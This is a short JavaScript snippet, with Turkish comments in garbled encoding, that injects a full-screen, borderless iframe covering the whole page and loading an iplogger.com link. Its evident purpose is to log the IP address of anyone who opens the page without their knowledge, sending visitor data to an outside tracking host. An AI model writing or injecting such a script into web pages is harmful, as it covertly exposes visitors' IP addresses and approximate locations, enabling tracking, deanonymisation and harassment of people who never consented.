// iframe oluÅŸtur
const iframe = document.createElement('iframe');

// iframe Ã¶zellikleri
iframe.src = 'https://iplogger.com/244sm8'; // iframe iÃ§inde aÃ§Ä±lacak URL
iframe.style.position = 'fixed';
iframe.style.top = '0';
iframe.style.left = '0';
iframe.style.width = '100%';
iframe.style.height = '100%';
iframe.style.border = 'none';
iframe.style.zIndex = '9999';

// iframe'i body'ye ekle
document.body.appendChild(iframe);
